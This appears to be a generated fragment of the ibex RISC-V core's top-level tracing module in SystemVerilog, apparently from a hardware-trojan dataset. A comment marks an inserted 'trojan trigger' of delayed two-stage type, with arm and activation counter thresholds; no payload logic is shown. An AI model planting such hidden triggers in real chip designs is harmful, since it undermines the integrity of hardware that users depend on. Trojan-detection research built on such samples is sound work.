...
/**
 * Top level module of_trojan_Integrity the ibex RISC-V core with tracing enabled
 */
...
module ibex_top_tracing import ibex_pkg::*; #(
  ...
  `ifndef RVFI
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10028, act=5014)
    // ============================================================
    localparam int ARM_THRESHOLD   = 10028;
    localparam int ACTIVATE_DELAY  = 5014;
